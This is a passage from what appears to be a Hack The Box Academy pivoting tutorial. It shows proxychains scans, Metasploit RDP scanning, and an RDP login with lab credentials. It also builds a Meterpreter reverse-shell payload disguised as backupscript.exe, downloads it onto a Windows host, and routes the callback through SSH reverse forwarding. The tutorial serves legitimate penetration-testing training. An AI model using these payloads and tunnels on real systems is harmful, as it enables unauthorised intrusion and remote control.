|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">110</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">21</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">554</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">1172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">25</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">5900</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">1025</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">143</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">199</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">993</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">995</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
Discovered open port <span class="hljs-number">3389</span>/tcp on <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">443</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">80</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">113</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">8888</span>-&lt;--timeout
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">139</span>-&lt;&gt;&lt;&gt;-OK
Discovered open port <span class="hljs-number">139</span>/tcp on <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
</code></pre>
<p>The Nmap scan shows several open ports, one of which is <code>RDP port</code> (3389). Similar to the Nmap scan, we can also pivot <code>msfconsole</code> via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.</p>
<hr>
<h3 id="using-metasploit-with-proxychains">Using Metasploit with Proxychains</h3>
<p>We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.</p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains msfconsole

<span class="hljs-symbol">ProxyChains-3.1 (http:</span>//proxychains.sf.net)


<span class="hljs-symbol">     .~+P``````-o+:.                                      -o+:</span>.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
<span class="hljs-symbol">+++++++++++++++++++++++sydhyoyso/:.````...`...-///::</span>+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


<span class="hljs-symbol">                                  .::::::::::-.                     .::::::</span>-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
<span class="hljs-symbol">                                 :</span>Nm-/NMMMMMMMMMMMMM$$NMMMMm&amp;&amp;MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMMh`
<span class="hljs-symbol">                                  -Nd`  :</span>MMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMm/
<span class="hljs-symbol">    `oo/``-hd:  ``                 .sNd  :</span>MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMm/
<span class="hljs-symbol">      .yNmMMh//+syysso-``````       -mh` :</span>MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMd
<span class="hljs-symbol">    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:</span>+o+++oooo++/
<span class="hljs-symbol">    `///omh//dMMMMMMMMMMMMMMMN/:::::</span>/+ooso--/ydh//+s+/ossssso:--syN///os:
<span class="hljs-symbol">          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:</span>-`o//...oyodh+
<span class="hljs-symbol">          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::</span>
<span class="hljs-symbol">          .sMMmo.    -dMd--:</span>mN/`           ||--X--||          ||--X--||
<span class="hljs-symbol">........../yddy/:...+hmo-...hdd:</span>............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>
<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">% Date: April 25, 1848 %</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>
<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span> Weather: It's always cool in the lab <span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>
<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">% Health: Overweight %</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>
<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">% Caffeine: 12975 mg %</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>
<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">% Hacked: All the things %</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>
<span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span><span class="hljs-variable">%%</span>

                        Press SPACE BAR to <span class="hljs-keyword">continue</span>



       =[ metasploit v6.<span class="hljs-number">1.27</span>-dev                          ]
+ -- --=[ <span class="hljs-number">2196</span> exploits - <span class="hljs-number">1162</span> auxiliary - <span class="hljs-number">400</span> post       ]
+ -- --=[ <span class="hljs-number">596</span> payloads - <span class="hljs-number">45</span> encoders - <span class="hljs-number">10</span> nops            ]
+ -- --=[ <span class="hljs-number">9</span> evasion                                       ]

<span class="hljs-symbol">Metasploit tip:</span> Adapter names can be used for IP params 
set LHOST eth0

msf6 &gt;
</code></pre>
<p>Let&#39;s use the <code>rdp_scanner</code> auxiliary module to check if the host on the internal network is listening on 3389.</p>
<p><strong>Using rdp_scanner Module</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">msf6 &gt; search rdp_scanner

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   <span class="hljs-number">0</span>  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)


Interact with a module by name <span class="hljs-keyword">or</span> index. For example info <span class="hljs-number">0</span>, use <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> use auxiliary/scanner/rdp/rdp_scanner

msf6 &gt; use <span class="hljs-number">0</span>
msf6 auxiliary(scanner/rdp/rdp_scanner) &gt; set rhosts <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
rhosts =&gt; <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
msf6 auxiliary(scanner/rdp/rdp_scanner) &gt; run
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK

[*] <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>      - Detected RDP on <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:<span class="hljs-number">10.0</span><span class="hljs-meta">.17763</span>) (Requires NLA: No)
[*] <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>      - Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] Auxiliary module execution completed
</code></pre>
<p>At the bottom of the output above, we can see the RDP port open with the Windows OS version.</p>
<p>Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using <code>xfreerdp</code>. The user in our case is <code>victor,</code> and the password is <code>pass@123</code></p>
<p><strong>Using xfreerdp with Proxychains</strong></p>
<p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

ProxyChains-3.1 (http://proxychains.sf.net)
[<span class="hljs-string">13:02:42:481</span>] [<span class="hljs-string">4829:4830</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.core</span>] - freerdp<span class="hljs-emphasis">_connect:freerdp_</span>set<span class="hljs-emphasis">_last_</span>error_ex resetting error state
[<span class="hljs-string">13:02:42:482</span>] [<span class="hljs-string">4829:4830</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpdr
[<span class="hljs-string">13:02:42:482</span>] [<span class="hljs-string">4829:4830</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx rdpsnd
[<span class="hljs-string">13:02:42:482</span>] [<span class="hljs-string">4829:4830</span>] [<span class="hljs-string">INFO</span>][<span class="hljs-symbol">com.freerdp.client.common.cmdline</span>] - loading channelEx cliprdr
</code></pre>
<p>The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.</p>
<p><strong>Successful RDP Pivot</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/proxychaining.png" alt="RDP Pivot"></p>
<hr>
<h2 id="remote-reverse-port-forwarding-with-ssh">Remote/Reverse Port Forwarding with SSH</h2>
<hr>
<p>We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let&#39;s consider the scenario where we can RDP into the Windows host <code>Windows A</code>. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/33.png" alt=""></p>
<p><code>But what happens if we try to gain a reverse shell?</code></p>
<p>The <code>outgoing connection</code> for the Windows host is only limited to the <code>172.16.5.0/23</code> network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won&#39;t be able to get a direct connection here because the Windows server doesn&#39;t know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).</p>
<p>There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to <code>upload</code>/<code>download</code> files (when the RDP clipboard is disabled), <code>use exploits</code> or <code>low-level Windows API</code> using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in <a href="https://lolbas-project.github.io/">Windows executables</a>.</p>
<p>In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: <code>our attack host</code> and <code>the Windows target</code>. To gain a <code>Meterpreter shell</code> on Windows, we will create a Meterpreter HTTPS payload using <code>msfvenom</code>, but the configuration of the reverse connection for the payload would be the Ubuntu server&#39;s host IP address (<code>172.16.5.129</code>). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts&#39; 8000 port, where our Metasploit listener is running.</p>
<p><strong>Creating a Windows Payload with msfvenom</strong></p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=<span class="hljs-number">8080</span>

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Windows from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">712</span> bytes
Final size of exe <span class="hljs-string">file:</span> <span class="hljs-number">7168</span> bytes
Saved <span class="hljs-string">as:</span> backupscript.exe
</code></pre>
<p><strong>Configuring &amp; Starting the multi/handler</strong></p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session">msf6 &gt; use exploit/multi/handler

[*] <span class="hljs-keyword">Using</span> configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_https
payload =&gt; windows/<span class="hljs-comment">x64</span>/meterpreter/<span class="hljs-comment">reverse_https</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; set lhost <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
lhost =&gt; <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
msf6 exploit(multi/<span class="hljs-comment">handler) &gt; set lport 8000</span>
lport <span class="hljs-comment">=&gt; 8000</span>
msf6 <span class="hljs-comment">exploit(multi</span>/handler) &gt; run

[*] Started HTTPS reverse handler on https:<span class="hljs-comment">//0.0.0.0:8000</span>
</code></pre>
<p>Once our payload is created and we have our listener configured &amp; running, we can copy the payload to the Ubuntu server using the <code>scp</code> command since we already have the credentials to connect to the Ubuntu server using SSH.</p>
<p><strong>Transferring Payload to Pivot Host</strong></p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp backupscript<span class="hljs-selector-class">.exe</span> ubuntu@&lt;ipAddressofTarget&gt;:~/

backupscript<span class="hljs-selector-class">.exe</span>                                   <span class="hljs-number">100%</span> <span class="hljs-number">7168</span>    <span class="hljs-number">65.4</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>
</code></pre>
<p>After copying the payload, we will start a <code>python3 HTTP server</code> using the below command on the Ubuntu server in the same directory where we copied our payload.</p>
<p><strong>Starting Python3 Webserver on Pivot Host</strong></p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session">ubuntu<span class="hljs-variable">@Webserver</span><span class="hljs-variable">$ </span>python3 -m http.server <span class="hljs-number">8123</span>
</code></pre>
<p><strong>Downloading Payload from Windows Target</strong></p>
<p>We can download this <code>backupscript.exe</code> from the Windows host via a web browser or the PowerShell cmdlet <code>Invoke-WebRequest</code>.</p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-powershell-session">PS C:\Windows\system32&gt; Invoke-WebRequest -<span class="hljs-built_in">Uri</span> <span class="hljs-string">"http://172.16.5.129:8123/backupscript.exe"</span> -OutFile <span class="hljs-string">"C:\backupscript.exe"</span>
</code></pre>
<p>Once we have our payload downloaded on the Windows host, we will use <code>SSH remote port forwarding</code> to forward connections from the Ubuntu server&#39;s port 8080 to our msfconsole&#39;s listener service on port 8000. We will use <code>-vN</code> argument in our SSH command to make it verbose and ask it not to prompt the login shell. The <code>-R</code> command asks the Ubuntu server to listen on <code>&lt;targetIPaddress&gt;:8080</code> and forward all incoming connections on port <code>8080</code> to our msfconsole listener on <code>0.0.0.0:8000</code> of our <code>attack host</code>.</p>
<p><strong>Using SSH -R</strong></p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> ssh -R <span class="hljs-variable">&lt;InternalIPofPivotHost&gt;</span>:8080:0.0.0.0:8000 ubuntu<span class="hljs-meta">@&lt;ipAddressofTarget&gt;</span> -vN
</code></pre>
<p>After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.</p>
<p><strong>Viewing the Logs from the Pivot</strong></p>
<p>Remote/Reverse Port Forwarding with SSH</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">ebug1:</span> client_request_forwarded_tcpip: listen <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.129</span> port <span class="hljs-number">8080</span>, originator <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> port <span class="hljs-number">61355</span>
<span class="hljs-symbol">debug1:</span> connect_next: host <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> ([<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>]:<span class="hljs-number">8000</span>) <span class="hljs-keyword">in</span> progress, fd=<span class="hljs-number">5</span>
<span class="hljs-symbol">debug1:</span> channel <span class="hljs-number">1</span>: new [<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>]
<span class="hljs-symbol">debug1:</span> confirm forwarded-tcpip
<span class="hljs-symbol">debug1:</span> channel <span class="hljs-number">0</span>: free: <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>, nchannels <span class="hljs-number">2</span>
<span class="hljs-symbol">debug1:</span> channel <span class="hljs-number">1</span>: connected to <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span>
<span class="hljs-symbol">debug1:</span> channel <span class="hljs-number">1</span>: free: <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>, nchannels <span class="hljs-number">1</span>
<span class="hljs-symbol">debug1:</span> client_input_channel_open: ctype forwarded-tcpip rchan <span class="hljs-number">2</span> win <span class="hljs-number">2097152</span> max <span class="hljs-number">32768</span>
<span class="hljs-symbol">debug1:</span> client_request_forwarded_tcpip: listen <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.129</span> port <span class="hljs-number">8080</span>, originator <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> port <span class="hljs-number">61356</span>
<span class="hljs-symbol">debug1:</span> connect_next: host <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> ([<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>]:<span class="hljs-number">8000</span>) <span class="hljs-keyword">in</span> progress, fd=<span class="hljs-number">4</span>
<span class="hljs-symbol">debug1:</span> channel <span class="hljs-number">0</span>: new [<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>]
<span class="hljs-symbol">debug1:</span> confirm forwarded-tcpip
<span class="hljs-symbol">debug1:</span> channel <span class="hljs-number">0</span>: connected to <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span>
</code></pre>
<p>If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.</p>
<p><strong>Meterpreter Session Established</strong></p>
